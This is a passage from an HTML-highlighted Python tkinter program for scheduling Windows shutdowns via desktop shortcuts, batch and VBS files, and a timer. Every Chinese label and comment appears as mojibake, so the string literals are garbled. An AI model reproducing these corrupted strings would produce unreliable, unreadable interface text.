        preset_frame = ttk.Frame(time_frame)
        preset_frame.pack(pady=<span class="hljs-number">10</span>)
        
        preset_times = [
            (<span class="hljs-string">"30åˆ†é’Ÿå"</span>, <span class="hljs-number">1800</span>),
            (<span class="hljs-string">"1å°æ—¶å"</span>, <span class="hljs-number">3600</span>),
            (<span class="hljs-string">"2å°æ—¶å"</span>, <span class="hljs-number">7200</span>),
            (<span class="hljs-string">"3å°æ—¶å"</span>, <span class="hljs-number">10800</span>),
            (<span class="hljs-string">"5åˆ†é’Ÿå"</span>, <span class="hljs-number">300</span>)
        ]
        
        <span class="hljs-keyword">for</span> text, seconds <span class="hljs-keyword">in</span> preset_times:
            btn = ttk.Button(preset_frame, text=text, 
                           command=<span class="hljs-keyword">lambda</span> s=seconds: self.set_custom_time(s))
            btn.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">5</span>)
        
        <span class="hljs-comment"># è‡ªå®šä¹‰æ—¶é—´è¾“å…¥</span>
        custom_frame = ttk.Frame(time_frame)
        custom_frame.pack(pady=<span class="hljs-number">10</span>)
        
        ttk.Label(custom_frame, text=<span class="hljs-string">"è‡ªå®šä¹‰æ—¶é—´ï¼š"</span>).pack(side=<span class="hljs-string">'left'</span>)
        
        self.hour_var = tk.StringVar(value=<span class="hljs-string">"0"</span>)
        hour_spin = ttk.Spinbox(custom_frame, from_=<span class="hljs-number">0</span>, to=<span class="hljs-number">23</span>, width=<span class="hljs-number">5</span>, 
                               textvariable=self.hour_var)
        hour_spin.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">5</span>)
        ttk.Label(custom_frame, text=<span class="hljs-string">"å°æ—¶"</span>).pack(side=<span class="hljs-string">'left'</span>)
        
        self.minute_var = tk.StringVar(value=<span class="hljs-string">"30"</span>)
        minute_spin = ttk.Spinbox(custom_frame, from_=<span class="hljs-number">0</span>, to=<span class="hljs-number">59</span>, width=<span class="hljs-number">5</span>,
                                 textvariable=self.minute_var)
        minute_spin.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">5</span>)
        ttk.Label(custom_frame, text=<span class="hljs-string">"åˆ†é’Ÿ"</span>).pack(side=<span class="hljs-string">'left'</span>)
        
        <span class="hljs-comment"># å‘½ä»¤é¢„è§ˆåŒºåŸŸ</span>
        preview_frame = ttk.LabelFrame(frame, text=<span class="hljs-string">"å‘½ä»¤é¢„è§ˆ"</span>, style=<span class="hljs-string">'Method.TLabelframe'</span>)
        preview_frame.pack(fill=<span class="hljs-string">'x'</span>, padx=<span class="hljs-number">20</span>, pady=<span class="hljs-number">10</span>)
        
        self.command_var = tk.StringVar()
        command_label = ttk.Label(preview_frame, textvariable=self.command_var, 
                                 font=(<span class="hljs-string">'Consolas'</span>, <span class="hljs-number">10</span>))
        command_label.pack(pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># æŒ‰é’®åŒºåŸŸ</span>
        button_frame = ttk.Frame(frame)
        button_frame.pack(pady=<span class="hljs-number">20</span>)
        
        self.set_btn1 = ttk.Button(button_frame, text=<span class="hljs-string">"è®¾ç½®å®šæ—¶å…³æœº"</span>, 
                                  command=self.set_shutdown_cmd, style=<span class="hljs-string">'Large.TButton'</span>)
        self.set_btn1.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">10</span>)
        
        self.cancel_btn1 = ttk.Button(button_frame, text=<span class="hljs-string">"å–æ¶ˆå®šæ—¶å…³æœº"</span>, 
                                     command=self.cancel_shutdown_cmd, style=<span class="hljs-string">'Large.TButton'</span>)
        self.cancel_btn1.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># æ›´æ–°å‘½ä»¤é¢„è§ˆ</span>
        self.update_command_preview()
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_method2_tab</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åˆ›å»ºæ–¹æ³•äºŒé€‰é¡¹å¡ï¼šå¿«æ·æ–¹å¼"""</span>
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text=<span class="hljs-string">"æ–¹æ³•äºŒï¼šåˆ›å»ºå¿«æ·æ–¹å¼"</span>)
        
        <span class="hljs-comment"># è¯´æ˜æ ‡ç­¾</span>
        desc = <span class="hljs-string">"ä¸ºå¸¸ç”¨å…³æœºæ—¶é—´åˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼\nåŒå‡»å³å¯å¯åŠ¨å®šæ—¶å…³æœº"</span>
        desc_label = ttk.Label(frame, text=desc, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">10</span>))
        desc_label.pack(pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># å¿«æ·æ–¹å¼è®¾ç½®</span>
        shortcut_frame = ttk.LabelFrame(frame, text=<span class="hljs-string">"å¿«æ·æ–¹å¼è®¾ç½®"</span>, style=<span class="hljs-string">'Method.TLabelframe'</span>)
        shortcut_frame.pack(fill=<span class="hljs-string">'x'</span>, padx=<span class="hljs-number">20</span>, pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># å¿«æ·æ–¹å¼åç§°</span>
        name_frame = ttk.Frame(shortcut_frame)
        name_frame.pack(pady=<span class="hljs-number">10</span>, anchor=<span class="hljs-string">'w'</span>, padx=<span class="hljs-number">20</span>)
        
        ttk.Label(name_frame, text=<span class="hljs-string">"å¿«æ·æ–¹å¼åç§°ï¼š"</span>).pack(side=<span class="hljs-string">'left'</span>)
        self.shortcut_name = tk.StringVar(value=<span class="hljs-string">"å®šæ—¶å…³æœº"</span>)
        name_entry = ttk.Entry(name_frame, textvariable=self.shortcut_name, width=<span class="hljs-number">30</span>)
        name_entry.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># å…³æœºæ—¶é—´è®¾ç½®</span>
        time_frame = ttk.Frame(shortcut_frame)
        time_frame.pack(pady=<span class="hljs-number">10</span>, anchor=<span class="hljs-string">'w'</span>, padx=<span class="hljs-number">20</span>)
        
        ttk.Label(time_frame, text=<span class="hljs-string">"å…³æœºæ—¶é—´ï¼š"</span>).pack(side=<span class="hljs-string">'left'</span>)
        
        self.shortcut_hours = tk.StringVar(value=<span class="hljs-string">"1"</span>)
        hour_spin = ttk.Spinbox(time_frame, from_=<span class="hljs-number">0</span>, to=<span class="hljs-number">23</span>, width=<span class="hljs-number">3</span>,
                               textvariable=self.shortcut_hours)
        hour_spin.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">5</span>)
        ttk.Label(time_frame, text=<span class="hljs-string">"å°æ—¶"</span>).pack(side=<span class="hljs-string">'left'</span>)
        
        self.shortcut_minutes = tk.StringVar(value=<span class="hljs-string">"0"</span>)
        minute_spin = ttk.Spinbox(time_frame, from_=<span class="hljs-number">0</span>, to=<span class="hljs-number">59</span>, width=<span class="hljs-number">3</span>,
                                 textvariable=self.shortcut_minutes)
        minute_spin.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">5</span>)
        ttk.Label(time_frame, text=<span class="hljs-string">"åˆ†é’Ÿ"</span>).pack(side=<span class="hljs-string">'left'</span>)
        
        <span class="hljs-comment"># å¿«æ·æ–¹å¼å†…å®¹é¢„è§ˆ</span>
        preview_frame = ttk.LabelFrame(frame, text=<span class="hljs-string">"å¿«æ·æ–¹å¼å†…å®¹"</span>, style=<span class="hljs-string">'Method.TLabelframe'</span>)
        preview_frame.pack(fill=<span class="hljs-string">'x'</span>, padx=<span class="hljs-number">20</span>, pady=<span class="hljs-number">10</span>)
        
        self.shortcut_content = tk.Text(preview_frame, height=<span class="hljs-number">4</span>, font=(<span class="hljs-string">'Consolas'</span>, <span class="hljs-number">9</span>))
        self.shortcut_content.pack(pady=<span class="hljs-number">10</span>, padx=<span class="hljs-number">10</span>, fill=<span class="hljs-string">'x'</span>)
        self.shortcut_content.insert(<span class="hljs-string">'1.0'</span>, <span class="hljs-string">"shutdown -s -t 3600"</span>)
        self.shortcut_content.config(state=<span class="hljs-string">'disabled'</span>)
        
        <span class="hljs-comment"># æŒ‰é’®åŒºåŸŸ</span>
        button_frame = ttk.Frame(frame)
        button_frame.pack(pady=<span class="hljs-number">20</span>)
        
        create_btn = ttk.Button(button_frame, text=<span class="hljs-string">"åˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼"</span>, 
                               command=self.create_shortcut, style=<span class="hljs-string">'Large.TButton'</span>)
        create_btn.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">10</span>)
        
        test_btn = ttk.Button(button_frame, text=<span class="hljs-string">"æµ‹è¯•æ­¤æ—¶é—´è®¾ç½®"</span>, 
                             command=self.test_shortcut_time, style=<span class="hljs-string">'Large.TButton'</span>)
        test_btn.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># ç»‘å®šå˜é‡å˜åŒ–äº‹ä»¶</span>
        self.shortcut_hours.trace(<span class="hljs-string">'w'</span>, self.update_shortcut_preview)
        self.shortcut_minutes.trace(<span class="hljs-string">'w'</span>, self.update_shortcut_preview)
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_method3_tab</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åˆ›å»ºæ–¹æ³•ä¸‰é€‰é¡¹å¡ï¼šä»»åŠ¡è®¡åˆ’ï¼ˆç®€åŒ–ç‰ˆï¼‰"""</span>
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text=<span class="hljs-string">"æ–¹æ³•ä¸‰ï¼šå®šæ—¶ä»»åŠ¡"</span>)
        
        <span class="hljs-comment"># è¯´æ˜æ ‡ç­¾</span>
        desc = <span class="hljs-string">"è®¾ç½®æ¯å¤©å›ºå®šæ—¶é—´è‡ªåŠ¨å…³æœº\né€‚åˆè§„å¾‹æ€§å®šæ—¶å…³æœºéœ€æ±‚"</span>
        desc_label = ttk.Label(frame, text=desc, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">10</span>))
        desc_label.pack(pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># æ—¶é—´è®¾ç½®</span>
        schedule_frame = ttk.LabelFrame(frame, text=<span class="hljs-string">"å®šæ—¶è®¾ç½®"</span>, style=<span class="hljs-string">'Method.TLabelframe'</span>)
        schedule_frame.pack(fill=<span class="hljs-string">'x'</span>, padx=<span class="hljs-number">20</span>, pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># æ—¶é—´é€‰æ‹©</span>
        time_frame = ttk.Frame(schedule_frame)
        time_frame.pack(pady=<span class="hljs-number">15</span>, anchor=<span class="hljs-string">'center'</span>)
        
        ttk.Label(time_frame, text=<span class="hljs-string">"æ¯å¤©å…³æœºæ—¶é—´ï¼š"</span>, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">10</span>)).pack(side=<span class="hljs-string">'left'</span>)
        
        self.schedule_hour = tk.StringVar(value=<span class="hljs-string">"22"</span>)
        hour_spin = ttk.Spinbox(time_frame, from_=<span class="hljs-number">0</span>, to=<span class="hljs-number">23</span>, width=<span class="hljs-number">3</span>,
                               textvariable=self.schedule_hour)
        hour_spin.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">5</span>)
        ttk.Label(time_frame, text=<span class="hljs-string">":"</span>).pack(side=<span class="hljs-string">'left'</span>)
        
        self.schedule_minute = tk.StringVar(value=<span class="hljs-string">"00"</span>)
        minute_spin = ttk.Spinbox(time_frame, from_=<span class="hljs-number">0</span>, to=<span class="hljs-number">59</span>, width=<span class="hljs-number">3</span>,
                                 textvariable=self.schedule_minute)
        minute_spin.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">5</span>)
        
        <span class="hljs-comment"># ä»»åŠ¡çŠ¶æ€æ˜¾ç¤º</span>
        self.task_status_var = tk.StringVar(value=<span class="hljs-string">"å½“å‰æ— å®šæ—¶ä»»åŠ¡"</span>)
        status_label = ttk.Label(schedule_frame, textvariable=self.task_status_var,
                                font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">9</span>))
        status_label.pack(pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># è®¡ç®—ä¸‹æ¬¡å…³æœºæ—¶é—´</span>
        self.next_time_var = tk.StringVar()
        next_time_label = ttk.Label(schedule_frame, textvariable=self.next_time_var,
                                   font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">9</span>))
        next_time_label.pack(pady=<span class="hljs-number">5</span>)
        
        <span class="hljs-comment"># æ¨¡æ‹Ÿä»»åŠ¡åŒºåŸŸ</span>
        sim_frame = ttk.LabelFrame(frame, text=<span class="hljs-string">"æ¨¡æ‹Ÿä»»åŠ¡ç®¡ç†"</span>, style=<span class="hljs-string">'Method.TLabelframe'</span>)
        sim_frame.pack(fill=<span class="hljs-string">'x'</span>, padx=<span class="hljs-number">20</span>, pady=<span class="hljs-number">10</span>)
        
        sim_desc = <span class="hljs-string">"""æ³¨æ„ï¼šè¿™æ˜¯ç®€åŒ–ç‰ˆæ¨¡æ‹Ÿå®šæ—¶ä»»åŠ¡ã€‚
çœŸå®çš„Windowsä»»åŠ¡è®¡åˆ’éœ€è¦ç®¡ç†å‘˜æƒé™å’Œå¤æ‚é…ç½®ã€‚
æœ¬ç¨‹åºä½¿ç”¨Pythonçº¿ç¨‹æ¨¡æ‹Ÿå®šæ—¶åŠŸèƒ½ã€‚"""</span>
        sim_label = ttk.Label(sim_frame, text=sim_desc, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">9</span>))
        sim_label.pack(pady=<span class="hljs-number">10</span>, padx=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># æŒ‰é’®åŒºåŸŸ</span>
        button_frame = ttk.Frame(frame)
        button_frame.pack(pady=<span class="hljs-number">20</span>)
        
        self.schedule_btn = ttk.Button(button_frame, text=<span class="hljs-string">"å¯åŠ¨å®šæ—¶ä»»åŠ¡"</span>, 
                                      command=self.toggle_schedule, style=<span class="hljs-string">'Large.TButton'</span>)
        self.schedule_btn.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">10</span>)
        
        ttk.Button(button_frame, text=<span class="hljs-string">"ç«‹å³æµ‹è¯•å…³æœº"</span>, 
                  command=self.test_schedule_shutdown, style=<span class="hljs-string">'Large.TButton'</span>).pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">10</span>)
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_status_bar</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åˆ›å»ºçŠ¶æ€æ """</span>
        status_frame = ttk.Frame(self.root)
        status_frame.pack(fill=<span class="hljs-string">'x'</span>, side=<span class="hljs-string">'bottom'</span>, pady=<span class="hljs-number">5</span>)
        
        self.status_var = tk.StringVar(value=<span class="hljs-string">"å°±ç»ª"</span>)
        status_label = ttk.Label(status_frame, textvariable=self.status_var, 
                                relief=<span class="hljs-string">'sunken'</span>, anchor=<span class="hljs-string">'w'</span>)
        status_label.pack(fill=<span class="hljs-string">'x'</span>, padx=<span class="hljs-number">10</span>, pady=<span class="hljs-number">2</span>)
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_custom_time</span>(<span class="hljs-params">self, seconds</span>):
        <span class="hljs-string">"""è®¾ç½®è‡ªå®šä¹‰æ—¶é—´åˆ°è¾“å…¥æ¡†"""</span>
        hours = seconds // <span class="hljs-number">3600</span>
        minutes = (seconds % <span class="hljs-number">3600</span>) // <span class="hljs-number">60</span>
        
        self.hour_var.<span class="hljs-built_in">set</span>(<span class="hljs-built_in">str</span>(hours))
        self.minute_var.<span class="hljs-built_in">set</span>(<span class="hljs-built_in">str</span>(minutes))
        self.update_command_preview()
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update_command_preview</span>(<span class="hljs-params">self, *args</span>):
        <span class="hljs-string">"""æ›´æ–°å‘½ä»¤é¢„è§ˆ"""</span>
        <span class="hljs-keyword">try</span>:
            hours = <span class="hljs-built_in">int</span>(self.hour_var.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            minutes = <span class="hljs-built_in">int</span>(self.minute_var.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            seconds = hours * <span class="hljs-number">3600</span> + minutes * <span class="hljs-number">60</span>
            
            <span class="hljs-keyword">if</span> seconds &gt; <span class="hljs-number">0</span>:
                self.command_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">f"shutdown -s -t <span class="hljs-subst">{seconds}</span>"</span>)
            <span class="hljs-keyword">else</span>:
                self.command_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">"è¯·è®¾ç½®æœ‰æ•ˆçš„å…³æœºæ—¶é—´"</span>)
        <span class="hljs-keyword">except</span> ValueError:
            self.command_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">"è¯·è¾“å…¥æœ‰æ•ˆæ•°å­—"</span>)
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update_shortcut_preview</span>(<span class="hljs-params">self, *args</span>):
        <span class="hljs-string">"""æ›´æ–°å¿«æ·æ–¹å¼å†…å®¹é¢„è§ˆ"""</span>
        <span class="hljs-keyword">try</span>:
            hours = <span class="hljs-built_in">int</span>(self.shortcut_hours.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            minutes = <span class="hljs-built_in">int</span>(self.shortcut_minutes.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            seconds = hours * <span class="hljs-number">3600</span> + minutes * <span class="hljs-number">60</span>
            
            <span class="hljs-keyword">if</span> seconds &gt; <span class="hljs-number">0</span>:
                content = <span class="hljs-string">f"shutdown -s -t <span class="hljs-subst">{seconds}</span>"</span>
                self.shortcut_content.config(state=<span class="hljs-string">'normal'</span>)
                self.shortcut_content.delete(<span class="hljs-string">'1.0'</span>, <span class="hljs-string">'end'</span>)
                self.shortcut_content.insert(<span class="hljs-string">'1.0'</span>, content)
                self.shortcut_content.config(state=<span class="hljs-string">'disabled'</span>)
        <span class="hljs-keyword">except</span> ValueError:
            <span class="hljs-keyword">pass</span>
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_shutdown_cmd</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""æ‰§è¡Œæ–¹æ³•ä¸€ï¼šè®¾ç½®å…³æœºå‘½ä»¤"""</span>
        <span class="hljs-keyword">try</span>:
            hours = <span class="hljs-built_in">int</span>(self.hour_var.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            minutes = <span class="hljs-built_in">int</span>(self.minute_var.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            seconds = hours * <span class="hljs-number">3600</span> + minutes * <span class="hljs-number">60</span>
            
            <span class="hljs-keyword">if</span> seconds &lt;= <span class="hljs-number">0</span>:
                messagebox.showwarning(<span class="hljs-string">"è­¦å‘Š"</span>, <span class="hljs-string">"è¯·è®¾ç½®æœ‰æ•ˆçš„å…³æœºæ—¶é—´"</span>)
                <span class="hljs-keyword">return</span>
                
            <span class="hljs-comment"># æ‰§è¡Œå…³æœºå‘½ä»¤</span>
            subprocess.run(<span class="hljs-string">f"shutdown -s -t <span class="hljs-subst">{seconds}</span>"</span>, shell=<span class="hljs-literal">True</span>)
            
            <span class="hljs-comment"># è®¡ç®—å…³æœºæ—¶é—´</span>
            shutdown_time = datetime.now() + timedelta(seconds=seconds)
            
            messagebox.showinfo(<span class="hljs-string">"æˆåŠŸ"</span>, 
                <span class="hljs-string">f"å®šæ—¶å…³æœºå·²è®¾ç½®ï¼\n"</span>
                <span class="hljs-string">f"ç³»ç»Ÿå°†åœ¨ <span class="hljs-subst">{hours}</span>å°æ—¶<span class="hljs-subst">{minutes}</span>åˆ†é’Ÿåå…³é—­\n"</span>
                <span class="hljs-string">f"é¢„è®¡å…³æœºæ—¶é—´ï¼š<span class="hljs-subst">{shutdown_time.strftime(<span class="hljs-string">'%Y-%m-%d %H:%M:%S'</span>)}</span>\n\n"</span>
                <span class="hljs-string">f"å¦‚éœ€å–æ¶ˆï¼Œè¯·ä½¿ç”¨å–æ¶ˆæŒ‰é’®æˆ–è¿è¡Œå‘½ä»¤ï¼šshutdown -a"</span>)
            
            self.status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">f"å·²è®¾ç½® <span class="hljs-subst">{hours}</span>å°æ—¶<span class="hljs-subst">{minutes}</span>åˆ†é’Ÿåå…³æœº"</span>)
            
        <span class="hljs-keyword">except</span> ValueError:
            messagebox.showerror(<span class="hljs-string">"é”™è¯¯"</span>, <span class="hljs-string">"è¯·è¾“å…¥æœ‰æ•ˆçš„æ•°å­—"</span>)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            messagebox.showerror(<span class="hljs-string">"é”™è¯¯"</span>, <span class="hljs-string">f"è®¾ç½®å¤±è´¥ï¼š<span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cancel_shutdown_cmd</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""å–æ¶ˆå®šæ—¶å…³æœº"""</span>
        <span class="hljs-keyword">try</span>:
            subprocess.run(<span class="hljs-string">"shutdown -a"</span>, shell=<span class="hljs-literal">True</span>)
            messagebox.showinfo(<span class="hljs-string">"æˆåŠŸ"</span>, <span class="hljs-string">"å®šæ—¶å…³æœºå·²å–æ¶ˆ"</span>)
            self.status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">"å®šæ—¶å…³æœºå·²å–æ¶ˆ"</span>)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            messagebox.showerror(<span class="hljs-string">"é”™è¯¯"</span>, <span class="hljs-string">f"å–æ¶ˆå¤±è´¥ï¼š<span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_shortcut</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼"""</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># è·å–æ¡Œé¢è·¯å¾„</span>
            desktop_path = os.path.join(os.path.expanduser(<span class="hljs-string">'~'</span>), <span class="hljs-string">'Desktop'</span>)
            
            <span class="hljs-comment"># è®¡ç®—ç§’æ•°</span>
            hours = <span class="hljs-built_in">int</span>(self.shortcut_hours.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            minutes = <span class="hljs-built_in">int</span>(self.shortcut_minutes.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            seconds = hours * <span class="hljs-number">3600</span> + minutes * <span class="hljs-number">60</span>
            
            <span class="hljs-keyword">if</span> seconds &lt;= <span class="hljs-number">0</span>:
                messagebox.showwarning(<span class="hljs-string">"è­¦å‘Š"</span>, <span class="hljs-string">"è¯·è®¾ç½®æœ‰æ•ˆçš„å…³æœºæ—¶é—´"</span>)
                <span class="hljs-keyword">return</span>
                
            <span class="hljs-comment"># åˆ›å»ºæ‰¹å¤„ç†æ–‡ä»¶</span>
            bat_content = <span class="hljs-string">f"""@echo off
echo æ­£åœ¨è®¾ç½®å®šæ—¶å…³æœº...
echo ç³»ç»Ÿå°†åœ¨ <span class="hljs-subst">{hours}</span>å°æ—¶<span class="hljs-subst">{minutes}</span>åˆ†é’Ÿåå…³é—­
shutdown -s -t <span class="hljs-subst">{seconds}</span>
pause
"""</span>
            
            <span class="hljs-comment"># åˆ›å»ºå¿«æ·æ–¹å¼å†…å®¹ï¼ˆVBSè„šæœ¬ï¼‰</span>
            shortcut_name = self.shortcut_name.get() <span class="hljs-keyword">or</span> <span class="hljs-string">"å®šæ—¶å…³æœº"</span>
            bat_filename = <span class="hljs-string">f"<span class="hljs-subst">{shortcut_name}</span>.bat"</span>
            bat_path = os.path.join(desktop_path, bat_filename)
            
            vbs_content = <span class="hljs-string">f"""Set WshShell = CreateObject("WScript.Shell")
Set oShellLink = WshShell.CreateShortcut("<span class="hljs-subst">{desktop_path}</span>\\<span class="hljs-subst">{shortcut_name}</span>.lnk")
oShellLink.TargetPath = "<span class="hljs-subst">{bat_path}</span>"
oShellLink.WindowStyle = 1
oShellLink.Description = "å®šæ—¶å…³æœºå¿«æ·æ–¹å¼"
oShellLink.Save
"""</span>
            
            <span class="hljs-comment"># ä¿å­˜æ‰¹å¤„ç†æ–‡ä»¶</span>
            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(bat_path, <span class="hljs-string">'w'</span>, encoding=<span class="hljs-string">'gbk'</span>) <span class="hljs-keyword">as</span> f:
                f.write(bat_content)
                
            <span class="hljs-comment"># ä¿å­˜VBSè„šæœ¬å¹¶åˆ›å»ºå¿«æ·æ–¹å¼</span>
            vbs_path = os.path.join(desktop_path, <span class="hljs-string">"create_shortcut.vbs"</span>)
            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(vbs_path, <span class="hljs-string">'w'</span>, encoding=<span class="hljs-string">'gbk'</span>) <span class="hljs-keyword">as</span> f:
                f.write(vbs_content)
                
            subprocess.run(<span class="hljs-string">f'cscript //nologo "<span class="hljs-subst">{vbs_path}</span>"'</span>, shell=<span class="hljs-literal">True</span>)
            
            <span class="hljs-comment"># æ¸…ç†ä¸´æ—¶æ–‡ä»¶</span>
            os.remove(vbs_path)
            
            messagebox.showinfo(<span class="hljs-string">"æˆåŠŸ"</span>, 
                <span class="hljs-string">f"å¿«æ·æ–¹å¼å·²åˆ›å»ºåˆ°æ¡Œé¢ï¼\n"</span>
                <span class="hljs-string">f"æ–‡ä»¶åï¼š<span class="hljs-subst">{shortcut_name}</span>.lnk\n"</span>
                <span class="hljs-string">f"åŒå‡»å³å¯è®¾ç½® <span class="hljs-subst">{hours}</span>å°æ—¶<span class="hljs-subst">{minutes}</span>åˆ†é’Ÿåå…³æœº"</span>)
            
            self.status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">f"å¿«æ·æ–¹å¼å·²åˆ›å»ºï¼š<span class="hljs-subst">{shortcut_name}</span>"</span>)
            
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            messagebox.showerror(<span class="hljs-string">"é”™è¯¯"</span>, <span class="hljs-string">f"åˆ›å»ºå¤±è´¥ï¼š<span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_shortcut_time</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""æµ‹è¯•å¿«æ·æ–¹å¼è®¾ç½®çš„å…³æœºæ—¶é—´"""</span>
        <span class="hljs-keyword">try</span>:
            hours = <span class="hljs-built_in">int</span>(self.shortcut_hours.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            minutes = <span class="hljs-built_in">int</span>(self.shortcut_minutes.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            seconds = hours * <span class="hljs-number">3600</span> + minutes * <span class="hljs-number">60</span>
            
            <span class="hljs-keyword">if</span> seconds &lt;= <span class="hljs-number">0</span>:
                messagebox.showwarning(<span class="hljs-string">"è­¦å‘Š"</span>, <span class="hljs-string">"è¯·è®¾ç½®æœ‰æ•ˆçš„å…³æœºæ—¶é—´"</span>)
                <span class="hljs-keyword">return</span>
                
            subprocess.run(<span class="hljs-string">f"shutdown -s -t <span class="hljs-subst">{seconds}</span>"</span>, shell=<span class="hljs-literal">True</span>)
            
            messagebox.showinfo(<span class="hljs-string">"æµ‹è¯•æˆåŠŸ"</span>, 
                <span class="hljs-string">f"å·²è®¾ç½®æµ‹è¯•å…³æœºï¼\n"</span>
                <span class="hljs-string">f"ç³»ç»Ÿå°†åœ¨ <span class="hljs-subst">{hours}</span>å°æ—¶<span class="hljs-subst">{minutes}</span>åˆ†é’Ÿåå…³é—­\n"</span>
                <span class="hljs-string">f"å¦‚éœ€å–æ¶ˆè¯·ä½¿ç”¨'å–æ¶ˆå®šæ—¶å…³æœº'æŒ‰é’®"</span>)
            
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            messagebox.showerror(<span class="hljs-string">"é”™è¯¯"</span>, <span class="hljs-string">f"æµ‹è¯•å¤±è´¥ï¼š<span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">toggle_schedule</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""å¯åŠ¨/åœæ­¢å®šæ—¶ä»»åŠ¡"""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.is_scheduled:
            <span class="hljs-keyword">try</span>:
                hour = <span class="hljs-built_in">int</span>(self.schedule_hour.get() <span class="hljs-keyword">or</span> <span class="hljs-number">22</span>)
                minute = <span class="hljs-built_in">int</span>(self.schedule_minute.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
                
                <span class="hljs-keyword">if</span> hour &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> hour &gt; <span class="hljs-number">23</span> <span class="hljs-keyword">or</span> minute &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> minute &gt; <span class="hljs-number">59</span>:
                    messagebox.showwarning(<span class="hljs-string">"è­¦å‘Š"</span>, <span class="hljs-string">"è¯·è¾“å…¥æœ‰æ•ˆçš„æ—¶é—´"</span>)
                    <span class="hljs-keyword">return</span>
                    
